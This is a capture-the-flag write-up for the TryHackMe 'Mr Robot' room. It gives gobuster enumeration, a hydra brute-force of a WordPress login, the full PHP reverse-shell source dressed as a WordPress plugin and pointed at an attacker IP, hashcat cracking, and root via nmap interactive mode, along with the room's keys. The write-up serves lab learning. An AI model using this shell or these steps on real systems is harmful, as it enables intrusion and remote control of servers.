---
title: "Mr Robot CTF"
category: "THM"
pubDate: 2020-05-10
description: "Mr Robot CTF writeup"
---

[TryHackMe | Mr Robot CTF](https://tryhackme.com/room/mrrobot)

Can
you root this Mr. Robot styled machine? This is a virtual machine meant
for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?

Credit to [Leon Johnson](https://twitter.com/@sho_luv) for creating this machine.

### Setup

```
kali@kali:~$ gobuster dir -u http://10.10.157.219/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```
kali@kali:~$ gobuster dir -u http://10.10.157.219/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.157.219/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/09 16:45:41 Starting gobuster
===============================================================
/images (Status: 301)
/blog (Status: 301)
/sitemap (Status: 200)
/rss (Status: 301)
/login (Status: 302)
/0 (Status: 301)
/feed (Status: 301)
/video (Status: 301)
/image (Status: 301)
/atom (Status: 301)
/wp-content (Status: 301)
/admin (Status: 301)
/audio (Status: 301)
/wp-login (Status: 200)
/intro (Status: 200)
/css (Status: 301)
/rss2 (Status: 301)
/license (Status: 200)
/wp-includes (Status: 301)
/js (Status: 301)
/Image (Status: 301)
/rdf (Status: 301)
/page1 (Status: 301)
/readme (Status: 200)
/robots (Status: 200)
```

```
kali@kali:~$ curl http://10.10.157.219/fsocity.dic > password.txt
```

### #1 What is key 1?

![](https://imgur.com/kSyfQPC.png)

![](https://imgur.com/ip9jZ1e.png)

```
073403c8a58a1f80d943455fb30724b9
```

### #2 What is key 2?

![](https://imgur.com/bGkyJa4.png)

```
kali@kali:~$ hydra -l Elliot -P password.txt 10.10.157.219 http-post-form "/wp-login:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=10.10.157.219/wp-admin/&testcookie=1:S=302"
```

```
[80][http-post-form] host: 10.10.157.219   login: "Elliot"  password: "ER28-0652"
```

![](https://imgur.com/h69iWzK.png)

### Now let's implement some php reverse shell.

```php
<?php
/*
Plugin Name:  Reverse Shell
Plugin URI: http://shell.com
Description: gimme a shell
Version: 1.0
Text Domain: shell
Domain Path: /languages
*/
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.9.2.228';  // CHANGE THIS
$port = 9999;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();

	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}

	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

![](https://imgur.com/iHDOA5E.png)

### But before we need to zip the shell.php to upload it.

```php
kali@kali:~/Desktop$ zip shell.zip shell.php
adding: shell.php (deflated 59%)
```

![](https://imgur.com/8R8hdRA.png)

Great we successfully upload our php shell ! Let's active it

![](https://imgur.com/TJWP8eN.png)

![](https://imgur.com/fQmZmpc.png)

Nice ! :D we have a shell let's make it fancy now

```php
python -c 'import pty; pty.spawn("/bin/bash")'
```

![](https://imgur.com/kMjgqa7.png)

![](https://imgur.com/MN5tFup.png)

As you can see we can't see the key2 but we have an hash so let's crack it

![](https://imgur.com/8GOkKch.png)

```
kali@kali:~/Desktop$ hashcat -m 0 --force hashmrrobot /usr/share/wordlists/rockyou.txt
```

```
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```

### #3 What is key 3?

![](https://imgur.com/37RDyTP.png)

```
su -l robot
Password: abcdefghijklmnopqrstuvwxyz
```

```
robot@linux:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@linux:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

### Final step getting root on the machine

On the TryHackMe website the hint was "nmap"

So i found this website [https://pentestlab.blog/category/privilege-escalation/](https://pentestlab.blog/category/privilege-escalation/) and it worked ! :D

```
robot@linux:~$ nmap --interactive
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# ls
ls
key-2-of-3.txt  password.raw-md5
# cd /root
cd /root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```


